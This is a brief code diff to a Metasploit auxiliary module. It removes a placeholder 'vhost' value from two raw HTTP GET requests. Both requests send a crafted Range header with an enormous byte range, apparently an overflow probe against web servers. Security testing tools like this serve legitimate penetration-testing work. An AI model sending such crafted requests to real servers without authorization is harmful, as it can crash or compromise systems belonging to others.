@@ -67,7 +67,6 @@ class Metasploit3 < Msf::Auxiliary
       req = cli.request_raw({
         'uri' => uri,
         'method' => 'GET',
-        'vhost'  => 'stuff',
         'headers' => {
           'Range' => 'bytes=18-18446744073709551615'
         }
@@ -102,7 +101,6 @@ class Metasploit3 < Msf::Auxiliary
     res = send_request_raw({
       'uri' => uri,
       'method' => 'GET',
-      'vhost'  => 'stuff',
       'headers' => {
         'Range' => 'bytes=0-18446744073709551615'
       }
